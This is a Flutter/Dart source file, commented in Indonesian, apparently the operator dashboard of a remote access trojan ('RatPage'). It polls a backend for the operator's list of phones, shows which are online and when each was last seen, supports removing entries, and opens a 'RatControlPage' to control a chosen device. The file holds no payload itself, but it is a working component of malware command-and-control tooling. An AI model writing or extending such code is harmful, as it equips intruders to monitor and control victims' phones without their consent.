import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'config.dart';
import 'rat_control_page.dart'; // ← tap device → RatControlPage

class RatPage extends StatefulWidget {
  final String sessionKey;
  final String role;
  final String uid;

  const RatPage({
    super.key,
    required this.sessionKey,
    required this.role,
    required this.uid,
  });

  @override
  State<RatPage> createState() => _RatPageState();
}

class _RatPageState extends State<RatPage> {
  static const Color accentColor = Color(0xFFFF99AC);
  static const Color bgMain      = Color(0xFFCED4DA);
  static const Color textMain    = Colors.black87;

  List<Map<String, dynamic>> _devices = [];
  bool   _loading = true;
  String _error   = '';
  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    // Auto-refresh setiap 10 detik
    _refreshTimer = Timer.periodic(
      const Duration(seconds: 10), (_) => _fetchDevices(),
    );
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    super.dispose();
  }

  // ── Fetch device dari API sesuai UID yang login ──────────────────
  Future<void> _fetchDevices() async {
    if (widget.uid.isEmpty || widget.uid == '00000000') {
      if (mounted) setState(() { _loading = false; _error = 'UID tidak ditemukan'; });
      return;
    }
    try {
      final res = await http.get(
        Uri.parse('$apiBaseUrl/getDevices?uid=${widget.uid}'),
      ).timeout(const Duration(seconds: 10));

      if (!mounted) return;

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        if (data['success'] == true) {
          final list = (data['devices'] as List? ?? [])
              .map((e) => Map<String, dynamic>.from(e as Map))
              .toList();
          setState(() { _devices = list; _loading = false; _error = ''; });
        } else {
          setState(() {
            _loading = false;
            _error   = (data['reason'] ?? 'Gagal ambil data').toString();
          });
        }
      } else {
        setState(() { _loading = false; _error = 'Server error: ${res.statusCode}'; });
      }
    } catch (_) {
      if (mounted) setState(() { _loading = false; _error = 'Timeout / koneksi gagal'; });
    }
  }

  // ── Hapus device ─────────────────────────────────────────────────
  Future<void> _removeDevice(String deviceId) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFFF8F9FA),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: const Text('Hapus Device?',
            style: TextStyle(color: Colors.black87, fontWeight: FontWeight.bold)),
        content: const Text('Device ini akan dihapus dari daftar.',
            style: TextStyle(color: Colors.black54)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('Batal', style: TextStyle(color: Colors.black54)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.redAccent,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () => Navigator.pop(context, true),
            child: const Text('Hapus',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
    if (ok != true) return;
    try {
      await http.delete(
        Uri.parse('$apiBaseUrl/removeDevice?uid=${widget.uid}&deviceId=$deviceId'),
      ).timeout(const Duration(seconds: 5));
      _fetchDevices();
    } catch (_) {}
  }

  // ── TAP device → langsung ke RatControlPage ───────────────────────
  void _openControl(Map<String, dynamic> device) {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => RatControlPage(
          device: device,
          uid:    widget.uid,
        ),
      ),
    );
  }

  // ── Long press device → dialog hapus ──────────────────────────────
  void _onLongPress(Map<String, dynamic> device) {
    final deviceId = (device['deviceId'] ?? '').toString();
    final name     = (device['deviceName'] ?? 'Device').toString();
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => Container(
        decoration: const BoxDecoration(
          color: Color(0xFFF8F9FA),
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            width: 40, height: 4,
            decoration: BoxDecoration(
                color: Colors.black26,
                borderRadius: BorderRadius.circular(2)),
          ),
          const SizedBox(height: 16),
          Text(name,
              style: const TextStyle(
                  fontWeight: FontWeight.bold, fontSize: 16, color: textMain)),
          const SizedBox(height: 16),
          SizedBox(
            width: double.infinity,
            child: OutlinedButton.icon(
              style: OutlinedButton.styleFrom(
                foregroundColor: Colors.redAccent,
                side: const BorderSide(color: Colors.redAccent),
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10)),
              ),
              icon: const Icon(Icons.delete_outline, size: 18),
              label: const Text('Hapus Device',
                  style: TextStyle(fontWeight: FontWeight.bold)),
              onPressed: () {
                Navigator.pop(context);
                _removeDevice(deviceId);
              },
            ),
          ),
        ]),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        automaticallyImplyLeading: false,
        backgroundColor: Colors.transparent,
        elevation: 0,
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.black54),
            tooltip: 'Refresh',
            onPressed: () {
              setState(() => _loading = true);
              _fetchDevices();
            },
          ),
        ],
      ),
      body: _buildBody(),
    );
  }

  Widget _buildBody() {
    if (_loading) {
      return const Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          CircularProgressIndicator(color: accentColor),
          SizedBox(height: 16),
          Text('Mengambil data device...',
              style: TextStyle(color: Colors.black54, fontSize: 13)),
        ]),
      );
    }
    if (_devices.isEmpty) return _buildEmptyState();
    return _buildDeviceList();
  }

  Widget _buildEmptyState() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 32),
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          const Icon(Icons.devices_other_rounded, size: 100, color: Colors.black12),
          const SizedBox(height: 20),
          const Text('TIDAK ADA DEVICE',
              style: TextStyle(
                color: textMain, fontFamily: 'Orbitron',
                fontSize: 18, fontWeight: FontWeight.bold, letterSpacing: 2,
              )),
          const SizedBox(height: 10),
          Text(
            _error.isNotEmpty ? _error : 'Coba ubah filter atau tunggu koneksi.',
            style: const TextStyle(color: Colors.black54, fontSize: 13),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            style: ElevatedButton.styleFrom(
              backgroundColor: accentColor, foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            icon: const Icon(Icons.refresh, size: 18),
            label: const Text('REFRESH',
                style: TextStyle(fontWeight: FontWeight.bold)),
            onPressed: () {
              setState(() => _loading = true);
              _fetchDevices();
            },
          ),
        ]),
      ),
    );
  }

  Widget _buildDeviceList() {
    final online  = _devices.where((d) => d['online'] == true).length;
    final offline = _devices.length - online;

    return Column(children: [
      // Summary bar
      Container(
        margin: const EdgeInsets.fromLTRB(16, 0, 16, 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.circular(10),
          boxShadow: [BoxShadow(
              color: Colors.black.withOpacity(0.04),
              blurRadius: 6, offset: const Offset(0, 2))],
        ),
        child: Row(children: [
          _statChip('🟢 Online',  online.toString(),          Colors.green),
          const SizedBox(width: 12),
          _statChip('🔴 Offline', offline.toString(),         Colors.redAccent),
          const SizedBox(width: 12),
          _statChip('📱 Total',   _devices.length.toString(), Colors.black54),
        ]),
      ),

      // List device
      Expanded(
        child: ListView.builder(
          padding: const EdgeInsets.fromLTRB(16, 0, 16, 100),
          itemCount: _devices.length,
          itemBuilder: (_, i) {
            final d        = _devices[i];
            final isOnline = d['online'] == true;
            final name     = (d['deviceName'] ?? 'Unknown Device').toString();

            return GestureDetector(
              // ✅ Tap → langsung ke halaman kontrol
              onTap: () => _openControl(d),
              // Long press → opsi hapus device
              onLongPress: () => _onLongPress(d),
              child: Container(
                margin: const EdgeInsets.only(bottom: 12),
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(
                    color: isOnline
                        ? accentColor.withOpacity(0.4)
                        : Colors.grey.shade200,
                  ),
                  boxShadow: [BoxShadow(
                    color: Colors.black.withOpacity(0.04),
                    blurRadius: 8, offset: const Offset(0, 3),
                  )],
                ),
                child: Row(children: [
                  // Icon HP
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: isOnline
                          ? accentColor.withOpacity(0.12)
                          : Colors.grey.shade100,
                      shape: BoxShape.circle,
                    ),
                    child: Icon(Icons.phone_android,
                        color: isOnline ? accentColor : Colors.grey, size: 22),
                  ),
                  const SizedBox(width: 12),

                  // Info device
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(name,
                            style: const TextStyle(
                                color: textMain, fontWeight: FontWeight.bold,
                                fontSize: 14),
                            overflow: TextOverflow.ellipsis),
                        const SizedBox(height: 3),
                        Text(
                          (d['deviceId'] ?? '-').toString(),
                          style: const TextStyle(
                              color: Colors.black38, fontSize: 11,
                              fontFamily: 'ShareTechMono'),
                          overflow: TextOverflow.ellipsis,
                        ),
                        const SizedBox(height: 3),
                        Text(
                          _lastSeenText(d['lastSeen']),
                          style: const TextStyle(
                              color: Colors.black38, fontSize: 10),
                        ),
                      ],
                    ),
                  ),

                  // Status badge + chevron
                  Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 10, vertical: 4),
                      decoration: BoxDecoration(
                        color: isOnline
                            ? Colors.greenAccent.withOpacity(0.15)
                            : Colors.grey.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(20),
                      ),
                      child: Text(
                        isOnline ? 'ONLINE' : 'OFFLINE',
                        style: TextStyle(
                          color: isOnline ? Colors.green : Colors.grey,
                          fontSize: 10, fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                    const SizedBox(height: 6),
                    const Icon(Icons.chevron_right,
                        color: Colors.black26, size: 18),
                  ]),
                ]),
              ),
            );
          },
        ),
      ),
    ]);
  }

  Widget _statChip(String label, String value, Color color) {
    return Row(mainAxisSize: MainAxisSize.min, children: [
      Text(label, style: TextStyle(color: color, fontSize: 11)),
      const SizedBox(width: 4),
      Text(value,
          style: TextStyle(color: color, fontWeight: FontWeight.bold, fontSize: 13)),
    ]);
  }

  String _lastSeenText(dynamic lastSeen) {
    if (lastSeen == null) return 'Belum pernah online';
    final ms = lastSeen is int ? lastSeen : int.tryParse(lastSeen.toString()) ?? 0;
    if (ms == 0) return 'Belum pernah online';
    final diff = DateTime.now().difference(
        DateTime.fromMillisecondsSinceEpoch(ms));
    if (diff.inSeconds < 60)  return 'Online ${diff.inSeconds} detik yang lalu';
    if (diff.inMinutes < 60)  return '${diff.inMinutes} menit yang lalu';
    if (diff.inHours   < 24)  return '${diff.inHours} jam yang lalu';
    return '${diff.inDays} hari yang lalu';
  }
}
